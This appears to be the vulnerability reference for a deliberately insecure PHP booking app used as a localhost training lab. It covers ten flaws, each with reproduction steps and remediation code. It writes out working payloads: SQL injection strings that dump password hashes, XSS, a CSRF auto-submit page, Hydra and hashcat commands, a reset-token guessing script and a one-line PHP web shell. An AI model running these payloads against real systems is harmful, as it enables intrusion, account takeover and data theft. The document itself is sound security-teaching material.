# BookEase Lab — Vulnerability Reference

> **WARNING:** This application is intentionally vulnerable.
> It must only be used on `localhost` in an isolated lab environment.
> Never expose it to a public network or use real personal data.

---

## VULN-01 — SQL Injection

| Field       | Value |
|-------------|-------|
| **Severity**  | Critical |
| **Affected**  | `login.php`, `search.php`, `rooms.php`, `admin/users.php`, `admin/bookings.php` |
| **Cause**     | Raw string concatenation in SQL queries — no prepared statements |

### How to Reproduce

**A) Login bypass (login.php)**
1. Go to `http://localhost/vuln1/login.php`
2. Enter username: `admin'--` and any password
3. Click Sign In → you are logged in as admin without knowing the password

**B) Boolean-based enumeration (login.php)**
- Username: `' OR '1'='1'--` → logs in as first user in DB

**C) UNION-based data extraction (search.php)**
1. Go to `http://localhost/vuln1/search.php`
2. Enter: `' UNION SELECT 1,username,password,email,5,6,7,8 FROM users--`
3. The page returns user data including MD5 hashes

**D) Error-based information extraction (search.php)**
- Query: `' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`

### Remediation
```php
// Vulnerable
$sql = "SELECT * FROM users WHERE username='$username'";

// Fixed — use prepared statements
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $hashed_password);
$stmt->execute();
```

---

## VULN-02 — Cross-Site Scripting (XSS)

| Field       | Value |
|-------------|-------|
| **Severity**  | High |
| **Affected**  | `search.php` (Reflected), `bookings.php` / `invoice.php` (Stored), `admin/bookings.php` (Stored in admin) |

### A) Reflected XSS (search.php)

1. Navigate to: `http://localhost/vuln1/search.php?q=<script>alert('XSS-Reflected')</script>`
2. The script executes immediately — the search term is echoed raw into the page

### B) Stored XSS (book.php → bookings.php / invoice.php)

1. Log in as `alice / password1`
2. Book any room
3. In "Special Requests / Notes", enter: `<img src=x onerror="alert('Stored XSS by alice')">`
4. Submit booking
5. Visit `bookings.php` or `invoice.php?id=<id>` — the script executes
6. An admin visiting `admin/bookings.php` also triggers it

### Remediation
```php
// Vulnerable — echoed raw
echo $q;

// Fixed — always escape output
echo htmlspecialchars($q, ENT_QUOTES, 'UTF-8');

// For stored content — sanitize on input too
$notes = strip_tags($_POST['notes']);
// Or use a library like HTML Purifier for rich content
```

---

## VULN-03 — Broken Access Control (BAC)

| Field       | Value |
|-------------|-------|
| **Severity**  | High |
| **Affected**  | `admin/index.php`, `admin/users.php`, `admin/bookings.php`, `admin/rooms.php` |
| **Cause**     | Admin check relies only on `$_SESSION['user']['role']` |

### How to Reproduce

**Method 1 — Session cookie manipulation**
1. Log in as `alice / password1`
2. Open browser DevTools → Application → Cookies
3. Find the `PHPSESSID` value
4. Use a PHP session editor or Burp Suite to modify the session file:
   - Session files are in `C:\laragon\tmp\sessions\` (or `/tmp/` on Linux)
   - Find the file named `sess_<your_PHPSESSID>`
   - Edit `role` from `customer` to `admin`
5. Refresh `/vuln1/admin/` — now accessible

**Method 2 — Direct URL access after privilege escalation**
- The `require_admin()` function only reads the session; a crafted session bypasses it entirely

### Remediation
```php
// Vulnerable — trusts session blindly
function require_admin() {
    if ($_SESSION['user']['role'] !== 'admin') { die('Denied'); }
}

// Fixed — re-verify role from database on each request
function require_admin() {
    $uid = (int)$_SESSION['user']['id'];
    $stmt = $conn->prepare("SELECT role FROM users WHERE id = ?");
    $stmt->bind_param("i", $uid);
    $stmt->execute();
    $row = $stmt->get_result()->fetch_assoc();
    if (!$row || $row['role'] !== 'admin') { http_response_code(403); die('Denied'); }
}
```

---

## VULN-04 — Weak Authentication & Session Management

| Field       | Value |
|-------------|-------|
| **Severity**  | High |
| **Affected**  | `login.php`, `register.php`, `logout.php`, `reset_password.php`, `includes/auth.php` |

### Issues

| Sub-issue | Detail |
|-----------|--------|
| **Weak hashing** | Passwords stored as `MD5($password)` — no salt, no bcrypt |
| **No lockout** | Unlimited login attempts — brute-force is unrestricted |
| **Session fixation** | `session_id()` not regenerated after login |
| **Insecure logout** | Cookie not explicitly deleted; back-button re-displays pages |
| **No password policy** | Register with password `1` — accepted |
| **Predictable reset token** | `MD5(username + YmdHi)` — guessable within a 1-minute window |

### How to Reproduce

**Brute-force (no lockout)**
```bash
# Using Hydra:
hydra -l alice -P /usr/share/wordlists/rockyou.txt \
      localhost http-post-form "/vuln1/login.php:username=^USER^&password=^PASS^:Incorrect password"
```

**MD5 cracking**
1. Extract hash via SQL injection: `' UNION SELECT password,2,3,4,5,6,7,8 FROM users LIMIT 1--`
2. Crack with hashcat: `hashcat -m 0 7c6a180b36896a0a8c02787eeafb0e4c /usr/share/wordlists/rockyou.txt`
   - Result: `password1`

**Predictable token**
```python
import hashlib, datetime
now = datetime.datetime.now()
for minute_offset in range(-5, 6):
    t = now + datetime.timedelta(minutes=minute_offset)
    token = hashlib.md5(f"alice{t.strftime('%Y%m%d%H%M')}".encode()).hexdigest()
    print(f"Try: /vuln1/reset_password.php?step=reset&token={token}")
```

### Remediation
```php
// Weak:  md5($password)
// Fixed: password_hash() / password_verify()
$hashed = password_hash($plain, PASSWORD_BCRYPT, ['cost' => 12]);
if (password_verify($plain, $stored_hash)) { /* OK */ }

// Regenerate session ID after login:
session_regenerate_id(true);

// Enforce account lockout:
// Track failed_attempts in DB; lock after 5 failures for 15 min
```

---

## VULN-05 — Insecure Direct Object Reference (IDOR)

| Field       | Value |
|-------------|-------|
| **Severity**  | High |
| **Affected**  | `invoice.php`, `cancel.php` |
| **Cause**     | Booking ID taken from URL without verifying the requester owns it |

### How to Reproduce

1. Log in as `alice / password1` (owns bookings #1 and #4)
2. Navigate to `http://localhost/vuln1/invoice.php?id=2`
3. You see Bob's booking — his room, dates, email, phone number (PII leak)
4. Navigate to `http://localhost/vuln1/cancel.php?id=2`
5. Submit the cancellation form → Bob's booking is cancelled

### Remediation
```php
// Vulnerable
$sql = "SELECT * FROM bookings WHERE id = $booking_id";

// Fixed — add ownership check
$stmt = $conn->prepare("SELECT * FROM bookings WHERE id = ? AND user_id = ?");
$stmt->bind_param("ii", $booking_id, $_SESSION['user']['id']);
// Admins and staff bypass with explicit role check
```

---

## VULN-06 — Price Manipulation

| Field       | Value |
|-------------|-------|
| **Severity**  | High |
| **Affected**  | `book.php` (POST handler) |
| **Cause**     | `total_price` is a hidden HTML form field read directly by the server |

### How to Reproduce

**Method 1 — Browser DevTools**
1. Log in and go to `/vuln1/book.php?room_id=1` (Ocean View Standard — $89/night)
2. Select 3 nights → total shows $267
3. Open DevTools → Inspector, find `<input type="hidden" id="total_price" value="267.00">`
4. Change the value to `1.00`
5. Submit → booking saved with total_price = $1.00

**Method 2 — Burp Suite intercept**
1. Enable Burp proxy
2. Submit booking form
3. In the intercepted POST, change `total_price=267.00` to `total_price=0.01`
4. Forward the request → price manipulation confirmed on invoice

### Remediation
```php
// Remove the hidden total_price field entirely.
// Always calculate price server-side:
$nights = (strtotime($check_out) - strtotime($check_in)) / 86400;
$total  = $room['price_per_night'] * $nights;
// Apply discount from DB-verified coupon
if ($coupon_discount > 0) {
    $total = $total * (1 - $coupon_discount / 100);
}
// Never read price from client POST
```

---

## VULN-07 — Missing CSRF Protection

| Field       | Value |
|-------------|-------|
| **Severity**  | Medium |
| **Affected**  | All forms: `login.php`, `book.php`, `cancel.php`, `profile.php`, `admin/*` |
| **Cause**     | No CSRF tokens generated or verified |

### How to Reproduce

**Malicious page that cancels victim's booking**
1. Log in as `alice` (or any account with a confirmed booking)
2. Attacker hosts this HTML on any page the victim visits:
```html
<html>
<body onload="document.forms[0].submit()">
  <form action="http://localhost/vuln1/cancel.php?id=1" method="POST">
    <!-- No CSRF token required — form silently submits -->
  </form>
</body>
</html>
```
3. Victim visits the attacker's page → booking #1 is cancelled without victim's knowledge

### Remediation
```php
// Generate token on session start / form render:
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Include in every form:
echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';

// Verify on every POST:
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    http_response_code(403); die('CSRF token mismatch');
}
```

---

## VULN-08 — Insecure File Upload

| Field       | Value |
|-------------|-------|
| **Severity**  | Critical |
| **Affected**  | `profile.php` (avatar upload) |
| **Cause**     | No file type, extension, or MIME validation; uploaded to a web-accessible directory |

### How to Reproduce

1. Create a file named `shell.php`:
```php
<?php system($_GET['cmd']); ?>
```
2. Log in, go to `/vuln1/profile.php`
3. Upload `shell.php` as your avatar
4. Access: `http://localhost/vuln1/uploads/shell.php?cmd=whoami`
5. Command output appears — Remote Code Execution (RCE) demonstrated

### Remediation
```php
$allowed_extensions = ['jpg','jpeg','png','gif','webp'];
$allowed_mimes      = ['image/jpeg','image/png','image/gif','image/webp'];

$ext  = strtolower(pathinfo($_FILES['avatar']['name'], PATHINFO_EXTENSION));
$mime = mime_content_type($_FILES['avatar']['tmp_name']);

if (!in_array($ext, $allowed_extensions) || !in_array($mime, $allowed_mimes)) {
    die('Invalid file type.');
}

// Rename the file — never trust the original name
$filename = bin2hex(random_bytes(16)) . '.' . $ext;

// Store outside the webroot if possible, or deny direct execution:
// Add to uploads/.htaccess:  php_flag engine off
```

---

## VULN-09 — Information Disclosure via Error Messages

| Field       | Value |
|-------------|-------|
| **Severity**  | Medium |
| **Affected**  | `includes/db.php`, `login.php`, `register.php`, `invoice.php`, `cancel.php`, all admin pages |

### What's Exposed

| Location | Disclosure |
|----------|-----------|
| `db.php` connection failure | DB hostname, username, password, database name |
| `login.php` — wrong password | Confirms username exists (user enumeration) |
| `login.php` — SQL error | Full MySQL error + raw SQL query |
| `register.php` | Which field (username or email) is already taken |
| `reset_password.php` | Whether email exists in DB |
| Upload error in `profile.php` | Full server filesystem path |

### Remediation
```php
// Disable PHP error display in production (php.ini):
display_errors = Off
log_errors     = On
error_log      = /var/log/php_errors.log

// Use generic user-facing messages:
if (!$result) {
    error_log("DB error: " . mysqli_error($conn));
    die("An unexpected error occurred. Please try again later.");
}

// Use consistent login failure messages:
$error = "Invalid username or password.";  // Never reveal which field failed
```

---

## VULN-10 — Missing Security Headers

| Field       | Value |
|-------------|-------|
| **Severity**  | Medium |
| **Affected**  | All pages — no headers set anywhere in the application |

### Missing Headers

| Header | Risk if Missing |
|--------|----------------|
| `Content-Security-Policy` | XSS payloads execute without restriction |
| `X-Frame-Options: DENY` | Clickjacking attacks — page can be embedded in iframes |
| `X-Content-Type-Options: nosniff` | MIME sniffing attacks |
| `Strict-Transport-Security` | HTTPS downgrade / stripping attacks |
| `Referrer-Policy` | Sensitive URLs leaked to third-party sites |
| `Permissions-Policy` | Unrestricted access to browser APIs |

### How to Verify
```bash
curl -I http://localhost/vuln1/
# None of the above headers appear in the response
```

### Remediation
```php
// Add to every PHP page, or configure in Apache/Nginx:
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("Referrer-Policy: strict-origin-when-cross-origin");
header("Permissions-Policy: geolocation=(), microphone=(), camera=()");
```

Or in Apache `.htaccess`:
```apache
Header always set X-Frame-Options "DENY"
Header always set X-Content-Type-Options "nosniff"
Header always set Content-Security-Policy "default-src 'self'"
```

---

*Last updated: 2026-10-24 | BookEase Lab v1.0*
